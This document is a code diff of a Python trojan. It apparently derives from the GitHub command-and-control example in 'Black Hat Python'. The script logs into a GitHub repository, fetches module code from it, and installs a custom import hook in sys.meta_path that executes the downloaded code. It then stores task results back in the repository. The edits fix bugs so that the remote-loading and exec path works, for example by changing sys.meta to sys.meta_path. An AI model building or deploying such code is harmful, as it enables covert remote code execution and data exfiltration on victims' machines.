@@ -12,7 +12,7 @@ from github3 import login
 module_id = 'm'
 module_config_path = module_id +'.json'
 data_path = 'data/{}/'.format(module_id)
-modules = []
+modules = {}
 configured = False
 task_queue = queue.Queue()
 password = sys.argv[1]
@@ -26,6 +26,7 @@ def connect_to_github():
     return gh, repo, branch
 
 def get_file_content(filepath):
+    global modules
 
     gh, repo, branch = connect_to_github()
     tree = branch.commit.commit.tree.recurse()
@@ -33,30 +34,25 @@ def get_file_content(filepath):
     with open(filepath, 'r') as fin:
         module_config = json.loads(fin.read())
     
-    modules = {}
-
-    
     for file_in_repo  in tree.to_json()['tree']:
         if file_in_repo['path'] in [m['module'] + '.py' for m in module_config]:
             print("[*] Found file {}".format(file_in_repo['path']))
             text = base64.b64decode(repo.blob(file_in_repo['sha']).content).decode('utf-8')
-            print(text)
             modules[file_in_repo['path'].replace('.py', '')] = text
 
-    print(modules)
-    return modules
 
 def get_module_config():
     global configured
-    config_json = get_file_content(module_config_path)
-    print(config_json)
-    config = json.loads(base64.b64decode(config_json))
+    global modules
+
+    get_file_content(module_config_path)
+
     configured = True
 
-    for task in config:
-        if task['module'] not in sys.modules:
-            exec('import ' + task['module'])
-    return config
+    for module, content in modules.items():
+        if module not in sys.modules:
+            print('try to import ' + module)
+            exec('import ' + module)
 
 def store_module_result(data):
     gh, repo, branch = connect_to_github()
@@ -71,7 +67,7 @@ class GitImporter(object):
     def find_module(self, fullname, path=None):
         if configured:
             print("[*] Attempting to retrieve {}".format(fullname))
-            new_library = get_file_contents("modules/{}".format(fullname))
+            new_library = get_file_contents(fullname)
 
         if new_library is not None:
             self.current_module_code = base64.b64decode(new_library)
@@ -92,7 +88,7 @@ def module_runner(module):
     store_module_result(result)
     return
 
-sys.meta = [GitImporter()]
+sys.meta_path = [GitImporter()]
 
 while True:
     if task_queue.empty():
